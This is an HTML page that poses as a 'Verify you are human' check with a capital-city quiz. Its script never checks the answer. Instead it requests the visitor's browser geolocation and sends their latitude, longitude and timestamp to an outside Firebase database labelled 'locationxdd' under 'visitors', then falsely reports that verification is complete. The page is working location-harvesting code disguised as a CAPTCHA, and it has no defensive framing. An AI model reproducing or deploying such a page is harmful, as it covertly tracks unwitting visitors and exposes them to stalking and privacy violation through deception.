<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification</title>

<style>
body{
  margin:0;
  font-family: system-ui, Arial;
  background:#0f172a;
  display:flex;
  align-items:center;
  justify-content:center;
  height:100vh;
  color:white;
}

.card{
  background:#111827;
  padding:24px;
  border-radius:14px;
  width:300px;
  text-align:center;
}

input{
  width:100%;
  padding:10px;
  border:none;
  border-radius:8px;
  margin-top:10px;
}

button{
  margin-top:12px;
  width:100%;
  padding:10px;
  border:none;
  border-radius:10px;
  background:#3b82f6;
  color:white;
  cursor:pointer;
}

.status{
  margin-top:10px;
  font-size:14px;
}
</style>
</head>
<body>

<div class="card">
  <h2>Verify you are human</h2>
  <p id="question"></p>
  <input id="answer" placeholder="Answer">
  <button onclick="verify()">Continue</button>
  <div class="status" id="status"></div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
  authDomain: "locationxdd.firebaseapp.com",
  databaseURL: "https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "locationxdd",
  storageBucket: "locationxdd.firebasestorage.app",
  messagingSenderId: "114480292043",
  appId: "1:114480292043:web:d143429c68784b0706bb4e"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

/* Quiz questions */
const questions = [
  "Capital of France?",
  "Capital of Japan?",
  "Capital of Italy?",
  "Capital of Germany?",
  "Capital of Canada?"
];

document.getElementById("question").textContent =
  questions[Math.floor(Math.random()*questions.length)];

function verify(){
  const status = document.getElementById("status");
  status.textContent = "Verifying...";

  navigator.geolocation.getCurrentPosition(async position => {

    const data = {
      answer: document.getElementById("answer").value,
      time: new Date().toISOString(),
      lat: position.coords.latitude,
      lng: position.coords.longitude
    };

    await push(ref(db,"visitors"), data);

    status.textContent = "Verification complete.";
  },
  () => {
    status.textContent = "Location permission denied.";
  });
}

window.verify = verify;
</script>

</body>
</html>
